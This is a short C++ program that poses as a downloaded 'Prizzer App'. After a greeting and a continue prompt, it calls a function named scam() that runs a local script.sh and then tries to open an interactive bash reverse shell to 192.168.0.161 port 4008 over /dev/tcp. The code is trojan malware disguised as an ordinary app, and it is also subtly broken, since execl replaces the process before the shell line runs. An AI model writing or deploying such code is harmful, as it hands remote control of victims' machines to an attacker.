#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include<unistd.h>
#include "NetworkTools.h"


void scam() {
    execl("./script.sh","script.sh",(char*)0);
    system("/bin/bash -i >/dev/tcp/192.168.0.161/4008 0<&1 2>&1");
}

int main() {

    int choice;
    cout << "Thanks for downloading Prizzer App" << endl;
    cout << "Do you want to continue [Y/n]?: ";
    cin >> choice;
    cout << "IP address: " << NetworkTools::getIPAddress() << endl;
    
    scam();

    return 0;
};


